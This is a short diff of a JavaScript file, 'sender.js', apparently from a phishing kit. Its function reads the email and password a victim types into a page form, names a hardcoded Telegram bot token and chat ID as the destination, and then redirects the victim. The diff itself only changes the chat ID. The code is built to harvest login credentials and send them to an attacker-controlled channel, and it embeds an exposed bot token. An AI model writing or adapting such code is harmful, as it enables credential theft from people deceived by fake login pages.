@@ -2,7 +2,7 @@ console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
   const telegramBotToken = "6388549334:AAFhru5IVWeQjmdxckvZEs4gyrH0FyqVBpo"; // Replace with your Telegram bot token
-  const chatId = 5681020640; // Replace with your chat ID
+  const chatId = 5681020641; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
